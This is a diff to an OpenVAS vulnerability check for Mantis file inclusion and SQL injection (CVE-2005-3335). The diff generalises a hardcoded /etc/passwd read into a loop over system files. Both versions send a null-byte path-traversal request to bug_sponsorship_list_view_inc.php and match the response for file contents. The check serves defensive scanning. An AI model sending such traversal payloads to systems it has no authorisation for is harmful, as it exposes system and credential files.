@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: mantis_file_incl_sql_inject.nasl 10771 2018-08-04 15:18:29Z cfischer $
+# $Id: mantis_file_incl_sql_inject.nasl 11761 2018-10-05 10:25:32Z jschulte $
 #
 # Mantis File Inclusion and SQL Injection Flaws
 #
@@ -29,8 +29,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.20093");
-  script_version("$Revision: 10771 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-04 17:18:29 +0200 (Sat, 04 Aug 2018) $");
+  script_version("$Revision: 11761 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-05 12:25:32 +0200 (Fri, 05 Oct 2018) $");
   script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
   script_cve_id("CVE-2005-3335");
   script_bugtraq_id(15210, 15212);
@@ -41,7 +41,7 @@ if(description)
   script_copyright("This script is Copyright (C) 2005 David Maciejak");
   script_family("Web application abuses");
   script_require_ports("Services/www", 80);
-  script_dependencies("mantis_detect.nasl");
+  script_dependencies("mantis_detect.nasl", "os_detection.nasl");
   script_mandatory_keys("mantisbt/installed");
 
   script_xref(name:"URL", value:"http://secunia.com/secunia_research/2005-46/advisory/");
@@ -71,26 +71,35 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port(default:80);
 
 install = get_kb_item(string("www/", port, "/mantis"));
 if (isnull(install)) exit(0);
+
+files = traversal_files();
+
 matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
 if (!isnull(matches)) {
   dir = matches[2];
 
-  url = string(dir, "/bug_sponsorship_list_view_inc.php?t_core_path=../../../../../../../../../../etc/passwd%00");
-  req = http_get(item:url, port:port);
-  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
-  if (isnull(res)) exit(0);
+  foreach pattern(keys(files)) {
 
-  if (egrep(pattern:"root:.*:0:[01]:", string:res) ||
-      egrep(pattern:"Warning.+main\(/etc/passwd.+failed to open stream", string:res) ||
-      egrep(pattern:"Failed opening .*'/etc/passwd", string:res) ) {
-    report = report_vuln_url(port:port, url:url);
-    security_message(port:port, data:report);
-    exit(0);
+    file = files[pattern];
+
+    url = string(dir, "/bug_sponsorship_list_view_inc.php?t_core_path=../../../../../../../../../../" + file + "%00");
+    req = http_get(item:url, port:port);
+    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
+    if (isnull(res)) exit(0);
+
+    if (egrep(pattern:pattern, string:res) ||
+        egrep(pattern:"Warning.+main\(/" + file + ".+failed to open stream", string:res) ||
+        egrep(pattern:"Failed opening .*'/" + file + "", string:res) ) {
+     report = report_vuln_url(port:port, url:url);
+      security_message(port:port, data:report);
+      exit(0);
+    }
   }
   exit(99);
 }
